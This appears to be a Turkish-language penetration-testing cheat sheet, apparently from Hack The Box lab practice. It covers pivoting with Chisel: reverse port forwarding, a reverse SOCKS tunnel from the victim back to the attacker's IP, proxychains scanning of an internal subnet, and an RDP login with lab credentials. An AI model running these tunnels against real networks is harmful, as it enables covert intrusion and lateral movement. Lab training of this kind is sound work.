# 1) Reverse Port Forwarding (en yaygın kullanım)

Hedef makine dışarı çıkabiliyor ama sen içeri giremiyorsun (NAT/firewall arkasında).
Hedefteki bir servisi kendi makinene çekersin.

Senin makinende (attacker) — server:
```bash
chisel server -p 8080 --reverse
```

Hedef makinede (victim) — client:
```bash
chisel client 10.10.14.5:8080 R:9000:127.0.0.1:3306
```
Sonuç: Hedefin `127.0.0.1:3306` (MySQL) portu, senin makinende `localhost:9000` olarak açılır.

R: = reverse anlamına gelir. 
## Format: 
```R:<local_port>:<hedef_ip>:<hedef_port>```

# 2) SOCKS Proxy (dinamik pivoting — en güçlü)

Tüm iç ağı proxychains/Burp üzerinden gezmek için. Tek tek port belirtmen gerekmez.

Senin makinende:
```
./chisel server -p 8080 --reverse
```

Hedef makinede:
```
./chisel client 10.10.14.5:8080 R:socks
```

Bu, senin makinende `127.0.0.1:1080` üzerinde bir SOCKS5 proxy açar. Sonra:

#### /etc/proxychains4.conf içine:
```bash
socks5 127.0.0.1 1080
```

# Kullanım:
```bash
proxychains nmap -sT -Pn 172.16.5.10
proxychains curl http://172.16.5.10
```

# 3) Local Port Forwarding

Sen server'a erişebiliyorsun ve onun arkasındaki bir servise erişmek istiyorsun.

Server (hedef tarafta):
```bash
chisel server -p 8080
```

Client (senin makinende):
```bash
chisel client <server_ip>:8080 9000:172.16.5.10:80
```

Senin `localhost:9000` → hedefin ağındaki `172.16.5.10:80`'e gider.

<br>

**Faydalı Bayraklar**

| Bayrak | Açıklama |
|--------|----------|
| `--reverse` | Server'ın reverse tünellere izin vermesi (zorunlu, reverse için) |
| `--socks5` | SOCKS5 desteği |
| `--auth user:pass` | Kimlik doğrulama (server ve client aynı olmalı) |
| `--keepalive 25s` | Bağlantıyı canlı tut (NAT timeout'a karşı) |
| `-v` | Verbose / debug logları |
| `--pid` | PID dosyası yaz |
| `R:socks` | Reverse SOCKS proxy |




# Advanced Chisel Usage


## usage

### Chiseli başka bir makinaya atalım (A-tacker Makinasından B Makinasına)

```bash
scp chisel ubuntu@10.129.202.64:~/

```


### B Makinasında Chisel ile sunucu açalım

```bash
# ubuntu@webserver$ 
chisel server -v -p 1234 --socks5
```
### A  Makinasından Chisele Bağlanalaım

```bash
# suslu7616@htb[/htb]$ 
# buradaki ip ve port B Makinasının  
chisel client -v 10.129.202.64:1234 socks
```
### Şimdi proxychains4 ayaarlarımızı yapalım

```bash

# suslu7616@htb[/htb]$ 

tail -f /etc/proxychains4.conf 

# bu satırı /etc/proxychains4.conf dosyasına ekleyelim ve proxy kısmındakini kapatalım
socks5 127.0.0.1 1080
```

### Şimdi windowsa bağlanalım A Makinasından

```bash
# suslu7616@htb[/htb]$ 

# /v: buradaki ip-adres targetteki windows makinası
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```



## Chisel Reverse Pivot


### kendi makinamızda A-tacker makinada server açalım

```bash
# suslu7616@htb[/htb]$ 

sudo chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234

```

### Target-Makinadan kendi Makinamıza Bağlanalım


```bash
# ubuntu@WEB01$
# 10.10.14.17:1234 Benim Makinamın ip Adresi Yani Atacker Makinasının

chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected

```

### şimdi kendi A-tacker Makinamızdan Target Makinadaki windowsa Bağlanalım

```bash
# suslu7616@htb[/htb]$ 
/v: B Makinasındaki windows Makina ip adresi
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
